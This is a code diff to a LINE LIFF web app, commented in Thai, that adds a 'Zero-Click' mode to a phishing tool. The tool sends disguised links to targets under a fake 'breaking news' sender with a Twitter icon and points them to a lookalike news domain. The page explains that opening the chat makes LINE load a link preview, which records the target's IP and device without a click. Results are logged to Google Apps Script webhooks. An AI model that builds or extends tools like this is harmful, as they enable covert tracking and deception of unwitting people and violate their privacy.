@@ -687,7 +687,25 @@
                     <input type="text" id="caseName" placeholder="ระบุชื่อหรือรายละเอียดเคส" required>
                 </div>
                 
+                <!-- เพิ่มตัวเลือกรูปแบบการทำ Phishing -->
                 <div class="form-group">
+                    <label for="phishingType">รูปแบบการส่งลิงก์</label>
+                    <div style="display: flex; gap: 10px; margin-top: 10px;">
+                        <div style="flex: 1; border: 1px solid #ddd; padding: 15px; border-radius: 8px; cursor: pointer; transition: all 0.3s ease;" 
+                            class="phishing-option" id="imagePhishingOption" onclick="selectPhishingOption('image')">
+                            <h3 style="margin-top: 0; color: var(--primary-color); font-size: 16px;"><i class="fas fa-image"></i> ส่งรูปภาพ</h3>
+                            <p style="margin-bottom: 0; font-size: 14px; color: #666;">แชร์รูปภาพไปยังเป้าหมาย เมื่อคลิกที่รูปจะบันทึกข้อมูลเป้าหมาย</p>
+                        </div>
+                        <div style="flex: 1; border: 1px solid #ddd; padding: 15px; border-radius: 8px; cursor: pointer; transition: all 0.3s ease;" 
+                            class="phishing-option" id="zeroClickOption" onclick="selectPhishingOption('zeroclick')">
+                            <h3 style="margin-top: 0; color: #FF9800; font-size: 16px;"><i class="fas fa-bolt"></i> Zero-Click</h3>
+                            <p style="margin-bottom: 0; font-size: 14px; color: #666;">ส่งลิงก์ที่บันทึกข้อมูลอัตโนมัติเมื่อเป้าหมายอ่านแชท</p>
+                        </div>
+                    </div>
+                    <input type="hidden" id="selectedPhishingType" value="image">
+                </div>
+                
+                <div class="form-group" id="imageUploadSection">
                     <label for="imageUpload">รูปภาพที่ส่งไปยังเป้าหมาย</label>
                     <button class="btn btn-file" id="selectImageBtn">
                         <i class="fas fa-image icon"></i> เลือกรูปภาพ
@@ -704,6 +722,19 @@
                         </div>
                     </div>
                 </div>
+
+                <!-- เพิ่มส่วนแสดงลิงก์ Zero-Click -->
+                <div class="form-group" id="zeroClickSection" style="display: none;">
+                    <div style="background-color: #FFF3E0; padding: 15px; border-radius: 8px; border-left: 4px solid #FF9800;">
+                        <h3 style="margin-top: 0; color: #FF9800; font-size: 16px;"><i class="fas fa-lightbulb"></i> การทำงานของ Zero-Click</h3>
+                        <p style="margin-bottom: 10px; font-size: 14px; line-height: 1.5;">
+                            ระบบจะสร้างลิงก์ที่มีรูปตัวอย่าง (Link Preview) เมื่อเป้าหมายเห็นข้อความในแชท LINE จะพยายามโหลดตัวอย่างลิงก์โดยอัตโนมัติ ทำให้สามารถบันทึกข้อมูลพื้นฐาน เช่น IP, อุปกรณ์ ได้ทันที
+                        </p>
+                        <p style="font-size: 13px; color: #E65100; margin-bottom: 0;">
+                            <i class="fas fa-exclamation-triangle"></i> หมายเหตุ: เทคนิคนี้อาจไม่ทำงานในบางเวอร์ชันของแอพ LINE หรือถ้าผู้ใช้ปิดการโหลด Link Preview
+                        </p>
+                    </div>
+                </div>
                 
                 <div class="loader">
                     <div class="loader-spinner"></div>
@@ -713,11 +744,11 @@
                 <div id="statusMessage" class="status"></div>
                 
                 <button class="btn btn-share" id="shareBtn" disabled>
-                    <i class="fas fa-paper-plane"></i> แชร์ภาพไปยังเป้าหมาย
+                    <i class="fas fa-paper-plane"></i> แชร์ไปยังเป้าหมาย
                 </button>
                 
                 <div class="tips">
-                    <p><strong>คำแนะนำ:</strong> เลือกรูปภาพที่น่าสนใจและมีขนาดไม่ใหญ่เกินไป เพื่อให้โหลดได้อย่างรวดเร็ว</p>
+                    <p><strong>คำแนะนำ:</strong> เลือกรูปแบบการส่งให้เหมาะกับสถานการณ์ Zero-Click เหมาะสำหรับตรวจสอบว่าเป้าหมายอ่านข้อความหรือไม่</p>
                 </div>
             </div>
         </div>
@@ -739,6 +770,7 @@
         let isLiffInitialized = false;
         let userHasPermission = false;
         let expirationStatus = ""; // เพิ่มตัวแปรเก็บวันหมดอายุ
+        let selectedPhishingType = "image"; // ค่าเริ่มต้นเป็นการส่งรูปภาพ
         
         // ค่า Config สำคัญ
         const LIFF_ID = '2007231851-0DqwXxQg';
@@ -746,8 +778,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzjaJSDYaPfosCf9jMTIMSyFdoOuiKjrYj2i2AfYp7i_W8Bhpxa3M5EUzu19q5WUho7/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxEToMuRYf4F6QjvwQhyVKfaFaytxCh5ZXQD-Ibt_asrxAiecrvLFNWOXcFM96vN_w/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxEToMuRYf4F6QjvwQhyVKfaFaytxCh5ZXQD-Ibt_asrxAiecrvLFNWOXcFM96vN_w/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
@@ -1048,11 +1080,19 @@
                     showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
                     return;
                 }
-                shareImage();
+                
+                if (selectedPhishingType === 'image') {
+                    shareImage();
+                } else {
+                    shareZeroClickLink();
+                }
             });
             
             // ตรวจสอบการเปลี่ยนแปลงชื่อเคส
             document.getElementById('caseName').addEventListener('input', checkCanShare);
+            
+            // ตั้งค่าตัวเลือกเริ่มต้น
+            selectPhishingOption('image');
             
             // ตั้งค่า Drag and Drop สำหรับรูปภาพ
             const dropArea = document.querySelector('.image-preview-container');
@@ -1107,6 +1147,36 @@
                 }
                 document.getElementById('imageUpload').click();
             });
+        }
+        
+        // เพิ่มฟังก์ชันเลือกรูปแบบการ phishing
+        function selectPhishingOption(type) {
+            selectedPhishingType = type;
+            document.getElementById('selectedPhishingType').value = type;
+            
+            // อัพเดตสถานะการเลือก
+            document.querySelectorAll('.phishing-option').forEach(option => {
+                option.style.borderColor = '#ddd';
+                option.style.backgroundColor = '#ffffff';
+            });
+            
+            if (type === 'image') {
+                document.getElementById('imagePhishingOption').style.borderColor = 'var(--primary-color)';
+                document.getElementById('imagePhishingOption').style.backgroundColor = 'rgba(88, 136, 231, 0.05)';
+                document.getElementById('imageUploadSection').style.display = 'block';
+                document.getElementById('zeroClickSection').style.display = 'none';
+                document.getElementById('shareBtn').innerHTML = '<i class="fas fa-paper-plane"></i> แชร์รูปภาพไปยังเป้าหมาย';
+                // ตรวจสอบความพร้อมสำหรับการส่งรูปภาพ
+                checkCanShare();
+            } else {
+                document.getElementById('zeroClickOption').style.borderColor = '#FF9800';
+                document.getElementById('zeroClickOption').style.backgroundColor = '#FFF8E1';
+                document.getElementById('imageUploadSection').style.display = 'none';
+                document.getElementById('zeroClickSection').style.display = 'block';
+                document.getElementById('shareBtn').innerHTML = '<i class="fas fa-bolt"></i> แชร์ลิงก์ Zero-Click';
+                // เปิดปุ่มแชร์สำหรับ Zero-Click เมื่อมีชื่อเคส
+                checkCanShare();
+            }
         }
         
         // จัดการรูปภาพที่เลือก
@@ -1202,7 +1272,7 @@
         }
         
         // บันทึกข้อมูล Tracking Key และ Case Name
-        async function saveTrackingCaseMapping(trackKey, caseName) {
+        async function saveTrackingCaseMapping(trackKey, caseName, imgUrl = null) {
             if (!isLiffInitialized || !userId) {
                 console.error('LIFF ยังไม่เริ่มต้นหรือไม่มี userId');
                 return false;
@@ -1213,7 +1283,7 @@
                 console.log('ชื่อเคส:', caseName);
                 console.log('ผู้สร้าง ID:', userId);
                 console.log('ชื่อผู้สร้าง:', displayName);
-                console.log('รูปภาพ URL:', imageUrl);
+                if (imgUrl) console.log('รูปภาพ URL:', imgUrl);
                 
                 // แสดงสถานะกำลังบันทึก
                 showStatus('กำลังบันทึกข้อมูล...', true);
@@ -1221,17 +1291,24 @@
                 // กำหนด unique request ID เพื่อตรวจสอบการทำงานซ้ำ
                 const requestId = generateUniqueId();
                 
-                // รวบรวมข้อมูลที่จะส่ง
+                // รวบรวมข้อมูลที่จะส่ง - ส่ง imageUrl ถ้ามี
                 const postData = {
                     action: 'saveTrackingMapping',
                     trackingKey: trackKey,
                     caseName: caseName,
                     creatorId: userId,
                     creatorName: displayName,
-                    imageUrl: imageUrl,
                     requestId: requestId,
                     timestamp: new Date().toISOString()
                 };
+                
+                // เพิ่ม imageUrl เฉพาะเมื่อมีค่า
+                if (imgUrl) {
+                    postData.imageUrl = imgUrl;
+                }
+                
+                // เพิ่ม phishingType เพื่อระบุประเภทการ phishing
+                postData.phishingType = selectedPhishingType;
 
                 // ทดลองส่งข้อมูลด้วย fetch API ก่อน (ตั้งค่า retry = 2 ครั้ง)
                 let success = await trySendDataWithFetch(postData, 2);
@@ -1443,10 +1520,20 @@
             const caseName = document.getElementById('caseName').value;
             const shareBtn = document.getElementById('shareBtn');
             
-            if (selectedImage && caseName && userHasPermission) {
-                shareBtn.disabled = false;
+            if (selectedPhishingType === 'image') {
+                // กรณีส่งรูปภาพ ต้องมีรูปภาพและชื่อเคส
+                if (selectedImage && caseName && userHasPermission) {
+                    shareBtn.disabled = false;
+                } else {
+                    shareBtn.disabled = true;
+                }
             } else {
-                shareBtn.disabled = true;
+                // กรณี Zero-Click ต้องมีเพียงชื่อเคสก็เพียงพอ
+                if (caseName && userHasPermission) {
+                    shareBtn.disabled = false;
+                } else {
+                    shareBtn.disabled = true;
+                }
             }
         }
         
@@ -1482,7 +1569,7 @@
                 imageUrl = await uploadImage();
                 if (!imageUrl) return;
                 
-                // 3. สร้าง URL สำหรับคลิก - เพิ่มพารามิเตอร์ source=image
+                // 3. สร้าง URL สำหรับคลิก - เพิ่มพารามิเตอร์ source=image (เดิมมีอยู่แล้ว)
                 const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackKey}&source=image`;
                 
                 // 4. สร้าง Flex Message พร้อมรูปภาพที่คลิกได้
@@ -1516,7 +1603,7 @@
                         
                         // 6. บันทึกข้อมูล Tracking หลังแชร์สำเร็จ
                         try {
-                            const saved = await saveTrackingCaseMapping(trackKey, caseName);
+                            const saved = await saveTrackingCaseMapping(trackKey, caseName, imageUrl);
                             if (saved) {
                                 console.log('บันทึก Tracking Key Mapping สำเร็จ');
                             }
@@ -1536,6 +1623,80 @@
             } catch (error) {
                 console.error('เกิดข้อผิดพลาดในการแชร์:', error);
                 showStatus('เกิดข้อผิดพลาดในการแชร์รูปภาพ: ' + (error.message || error), false);
+            }
+        }
+        
+        // เพิ่มฟังก์ชันสร้างและแชร์ลิงก์ Zero-Click
+        async function shareZeroClickLink() {
+            // ตรวจสอบเงื่อนไขก่อนแชร์
+            if (!isLiffInitialized) {
+                showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน', false);
+                return;
+            }
+            
+            if (!userHasPermission) {
+                showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
+                return;
+            }
+            
+            const caseName = document.getElementById('caseName').value;
+            if (!caseName) {
+                showStatus('กรุณาระบุชื่อเคส', false);
+                return;
+            }
+
+            try {
+                // 1. สร้าง Tracking Key
+                trackingKey = generateTrackingKey();
+                
+                // 2. สร้าง URL สำหรับคลิก - ใช้พารามิเตอร์ source=zeroclick
+                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}&source=zeroclick`;
+                
+                // 3. สร้าง Flex Message พร้อม URL Preview
+                const message = {
+                    type: 'text',
+                    text: clickTrackUrl,
+                    sender: {
+                        name: "ข่าวด่วน",
+                        iconUrl: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Twitter-logo.svg/800px-Twitter-logo.svg.png"
+                    }
+                };
+
+                console.log("กำลังแชร์ Zero-Click URL:", clickTrackUrl);
+
+                // 4. แชร์ผ่าน LINE ShareTargetPicker
+                if (liff.isApiAvailable('shareTargetPicker')) {
+                    const result = await liff.shareTargetPicker([message]);
+                    
+                    if (result) {
+                        showStatus('แชร์ลิงก์สำเร็จ', true);
+                        
+                        // 5. บันทึกข้อมูล Tracking หลังแชร์สำเร็จ
+                        try {
+                            // ถ้าเป็น Zero-Click ไม่มี imageUrl
+                            const saved = await saveTrackingCaseMapping(trackingKey, caseName, null);
+                            if (saved) {
+                                console.log('บันทึก Tracking Key Mapping สำเร็จ');
+                            }
+                        } catch (saveError) {
+                            console.error('เกิดข้อผิดพลาดในการบันทึก Tracking Key:', saveError);
+                        }
+
+                        // 6. รีเซ็ตแบบฟอร์ม
+                        resetForm();
+                        
+                        // กลับไปที่แท็บ Image Phishing (ถ้าต้องการ)
+                        // selectPhishingOption('image');
+                    } else {
+                        showStatus('การแชร์ถูกยกเลิก', false);
+                    }
+                } else {
+                    showStatus('ShareTargetPicker ไม่พร้อมใช้งาน', false);
+                }
+                
+            } catch (error) {
+                console.error('เกิดข้อผิดพลาดในการแชร์:', error);
+                showStatus('เกิดข้อผิดพลาดในการแชร์ลิงก์: ' + (error.message || error), false);
             }
         }
         
